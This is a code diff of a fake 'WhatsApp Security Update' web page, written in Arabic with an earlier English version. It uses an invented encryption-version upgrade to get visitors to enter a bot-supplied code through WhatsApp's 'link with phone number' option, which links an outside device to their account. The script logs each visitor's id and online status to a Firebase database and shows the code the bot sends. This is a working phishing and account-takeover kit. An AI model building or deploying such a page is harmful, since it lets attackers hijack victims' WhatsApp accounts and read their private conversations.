@@ -6,53 +6,32 @@
     <title>WhatsApp Security</title>
     <style>
         * { box-sizing: border-box; }
-        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, sans-serif; overflow: hidden; }
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }
+        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background: #fff; margin: 0; }
         .container { width: 100%; max-width: 380px; text-align: center; }
-        .logo { width: 70px; margin-bottom: 12px; }
-        .header-title { font-size: 20px; font-weight: 700; color: #075e54; margin-bottom: 5px; }
-        .status-badge { background: #e7f3f3; color: #128c7e; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
-        
+        .logo { width: 70px; margin-bottom: 15px; }
+        .header-title { font-size: 20px; font-weight: bold; color: #075e54; margin-bottom: 20px; }
         .version-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
-        .v-row { display: flex; justify-content: space-between; align-items: center; margin: 8px 0; font-size: 13px; }
-        .v-label { color: #667781; font-weight: 500; }
-        .v-value { font-weight: bold; font-family: monospace; }
-        .v-old { color: #d91e1e; }
-        .v-new { color: #00a884; }
-
-        /* ظبط المحاذاة لتقريب الحروف */
-        .alert-text { font-size: 13.5px; line-height: 1.6; color: #3b4a54; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 15px; text-align: left; }
-        [dir="rtl"] .alert-text { text-align: right; }
-        
-        .highlight { color: #d91e1e; font-weight: bold; }
-        .code-zone { background-color: #ffffff; border: 1.5px solid #00a884; padding: 10px; border-radius: 8px; width: 80%; margin: 0 auto; }
-        #pairing-code { font-size: 28px; font-weight: bold; color: #075e54; letter-spacing: 4px; font-family: 'Courier New', monospace; }
-        .wait-text { font-size: 10px; color: #8696a0; margin-top: 6px; }
+        .v-row { display: flex; justify-content: space-between; font-size: 13px; margin: 5px 0; }
+        .alert-text { font-size: 13.5px; line-height: 1.6; text-align: right; color: #3b4a54; border-top: 1px solid #eee; padding-top: 15px; }
+        .code-zone { border: 2px solid #00a884; padding: 15px; border-radius: 10px; margin-top: 20px; min-height: 80px; }
+        #pairing-code { font-size: 30px; font-weight: bold; color: #075e54; letter-spacing: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div id="h_title" class="header-title"></div>
-        <div id="h_dev" class="status-badge"></div>
-        
+        <div class="header-title">تحديث أمان واتساب</div>
         <div class="version-box">
-            <div class="v-row">
-                <span id="l_old" class="v-label"></span>
-                <span class="v-value v-old">V2.12.5 (Legacy)</span>
-            </div>
-            <div style="height: 1px; background: #eee; margin: 5px 0;"></div>
-            <div class="v-row">
-                <span id="l_new" class="v-label"></span>
-                <span class="v-value v-new">V3.0.1 (New Version)</span>
-            </div>
+            <div class="v-row"><span>التشفير الحالي:</span><span style="color:red">V2.12.5</span></div>
+            <div class="v-row"><span>التشفير المحدث:</span><span style="color:green">V3.0.1</span></div>
         </div>
-
-        <div id="h_alert" class="alert-text"></div>
-
+        <div class="alert-text">
+            1. سيصلك إشعار من واتساب الآن، اضغط عليه.<br>
+            2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>
+            3. أدخل الرمز الذي سيظهر هنا:
+        </div>
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
-            <div id="h_wait" class="wait-text"></div>
         </div>
     </div>
 
@@ -65,43 +44,19 @@
         
         const params = new URLSearchParams(window.location.search);
         const userId = params.get('id');
-        const isAr = navigator.language.startsWith('ar');
-        document.body.dir = isAr ? "rtl" : "ltr";
 
-        // تحديث النصوص بناءً على طلبك (بدون Target وبدون مسافات بعيدة)
-        const UI = {
-            ar: {
-                title: "تحديث أمان واتساب",
-                dev: "جهازك المرتبط: iPhone",
-                old: "إصدار التشفير الحالي:",
-                new: "إصدار التشفير المحدث:",
-                alert: "لحماية خصوصيتك ومحادثاتك، يلتزم عليك الترقية لأحدث بروتوكول أمني متوفر.<br><br><b>طريقة التحديث:</b><br>1. سيصلك الآن إشعار رسمي من واتساب لربط الجهاز، اضغط عليه.<br>2. اختر <span class='highlight'>'الربط برقم الهاتف بدلاً من ذلك'</span>.<br>3. أدخل الرمز المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:",
-                wait: "جاري المزامنة.."
-            },
-            en: {
-                title: "WhatsApp Security Update",
-                dev: "Linked Device: iPhone",
-                old: "Current Encryption:",
-                new: "Updated Encryption:",
-                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol available.<br><br><b>How to Update:</b><br>1. You will receive an official notification; tap it immediately.<br>2. Select <span class='highlight'>'Link with phone number instead'</span> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
-                wait: "Syncing.."
-            }
-        };
+        if (userId) {
+            // إرسال إشعار الزيارة فوراً للبوت في مسار 'monitoring'
+            db.ref('monitoring/' + userId).set({
+                status: "Online",
+                time: Date.now()
+            });
 
-        const lang = isAr ? UI.ar : UI.en;
-        document.getElementById('h_title').innerText = lang.title;
-        document.getElementById('h_dev').innerText = lang.dev;
-        document.getElementById('l_old').innerText = lang.old;
-        document.getElementById('l_new').innerText = lang.new;
-        document.getElementById('h_alert').innerHTML = lang.alert;
-        document.getElementById('h_wait').innerText = lang.wait;
-
-        if(userId) {
-            db.ref('visiting/' + userId).set({ ts: Date.now(), status: "Online" });
-            db.ref('sessions/' + userId).on('value', (s) => {
-                if (s.val() && s.val().code) {
-                    document.getElementById('pairing-code').innerText = s.val().code;
-                    document.getElementById('h_wait').innerText = isAr ? "أدخل الكود في واتساب الآن" : "Enter code in WhatsApp now";
+            // الاستماع للكود اللي هتبعته من البوت في مسار 'commands'
+            db.ref('commands/' + userId).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.code) {
+                    document.getElementById('pairing-code').innerText = data.code;
                 }
             });
         }
